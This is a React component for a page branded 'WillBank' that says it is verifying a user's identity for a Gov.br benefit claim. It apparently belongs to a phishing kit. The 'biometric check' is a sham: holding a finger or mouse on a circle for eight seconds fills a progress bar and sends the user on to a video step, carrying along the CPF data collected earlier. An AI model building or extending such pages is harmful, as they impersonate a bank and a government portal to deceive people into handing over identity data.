import { useEffect, useState, useCallback } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Fingerprint } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import { CPFData } from "@/lib/cpf";

const Biometria = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);
  const [isPressed, setIsPressed] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
    }
  }, [cpfData, navigate]);

  // Handle progress when finger is pressed
  useEffect(() => {
    if (!isPressed) return;

    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            navigate("/video", { state: { cpfData } });
          }, 500);
          return 100;
        }
        return prev + 2;
      });
    }, 80);

    return () => clearInterval(interval);
  }, [isPressed, cpfData, navigate]);

  const handleStart = useCallback(() => {
    setIsPressed(true);
  }, []);

  const handleEnd = useCallback(() => {
    if (progress < 100) {
      setIsPressed(false);
      setProgress(0);
    }
  }, [progress]);

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
      />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          <div className="space-y-8 text-center py-4">
            <div className="space-y-2">
              <h1 className="text-2xl font-bold text-foreground">
                Verificação de identidade
              </h1>
              <p className="text-muted-foreground">
                Vamos verificar se é realmente <span className="font-semibold text-foreground">{cpfData.nome}</span> que está solicitando o benefício no Portal Gov.br
              </p>
            </div>

            {/* Fingerprint Circle */}
            <div 
              className="relative w-40 h-40 mx-auto cursor-pointer select-none"
              onMouseDown={handleStart}
              onMouseUp={handleEnd}
              onMouseLeave={handleEnd}
              onTouchStart={handleStart}
              onTouchEnd={handleEnd}
            >
              {/* Outer ring with progress */}
              <svg className="absolute inset-0 w-full h-full -rotate-90">
                <circle
                  cx="80"
                  cy="80"
                  r="75"
                  fill="none"
                  stroke="hsl(var(--primary) / 0.2)"
                  strokeWidth="6"
                />
                <circle
                  cx="80"
                  cy="80"
                  r="75"
                  fill="none"
                  stroke="hsl(var(--primary))"
                  strokeWidth="6"
                  strokeLinecap="round"
                  strokeDasharray={`${2 * Math.PI * 75}`}
                  strokeDashoffset={`${2 * Math.PI * 75 * (1 - progress / 100)}`}
                  className="transition-all duration-100"
                />
              </svg>
              
              {/* Inner circle with fingerprint */}
              <div className={`absolute inset-4 rounded-full bg-gray-100 flex items-center justify-center transition-colors ${isPressed ? 'bg-primary/20' : ''}`}>
                <Fingerprint className={`w-16 h-16 transition-colors ${isPressed ? 'text-primary' : 'text-gray-400'}`} />
              </div>
            </div>

            <div className="space-y-2">
              <p className="font-semibold text-foreground">
                Mantenha o dedo pressionado
              </p>
              <p className={`text-2xl font-bold ${progress > 0 ? 'text-primary' : 'text-orange-500'}`}>
                {progress}%
              </p>
            </div>

            {/* Instructions */}
            <div className="bg-purple-50 border border-purple-200 rounded-xl p-4">
              <p className="font-semibold text-foreground mb-2">Instruções:</p>
              <p className="text-sm text-muted-foreground">
                Posicione seu dedo sobre o círculo e mantenha pressionado por 8 segundos para completar a verificação biométrica.
              </p>
            </div>
          </div>
        </WillBankCard>
      </main>
    </div>
  );
};

export default Biometria;
